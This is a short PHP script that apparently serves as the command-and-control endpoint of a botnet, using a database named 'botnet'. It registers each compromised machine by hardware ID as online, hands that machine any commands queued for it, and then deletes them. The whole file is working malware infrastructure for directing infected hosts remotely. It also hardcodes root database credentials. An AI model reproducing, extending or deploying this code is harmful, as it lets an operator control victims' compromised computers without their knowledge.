<?php

    $sql = new PDO("mysql:dbname=botnet;host=localhost","root","root");
    if(isset($_GET['hwid'])){
        
        $hwid = addslashes($_GET['hwid']);
        $pdo = $sql->prepare("SELECT hwid FROM online WHERE hwid = :h");
        $pdo->BindValue(":h",$hwid);
        $pdo->execute(); 
        if(!$pdo->rowCount() > 0){
            $pdo = $sql->prepare("INSERT INTO online (hwid,situacao) values (:x,:t)");
            $pdo->BindValue(":x",$hwid);
            $pdo->BindValue(":t", "ON");
            $pdo->execute(); 
        }

    }
    else {
        echo "";
    }
    $pdo = $sql->prepare("SELECT hwid FROM comando WHERE hwid = :h");
    $pdo->BindValue(":h",$hwid);
    $pdo->execute(); 
    if($pdo->rowCount() > 0){
        $pdo = $sql->prepare("SELECT comando FROM comando WHERE hwid = :h");
        $pdo->BindValue(":h",$hwid);
        $pdo->execute();

        while($comando = $pdo->fetch(PDO::FETCH_ASSOC)){
            echo "{$comando['comando']}";
        }
        $pdo = $sql->prepare("DELETE FROM comando WHERE hwid = :h");
        $pdo->BindValue(":h",$hwid);
        $pdo->execute();
    }


?>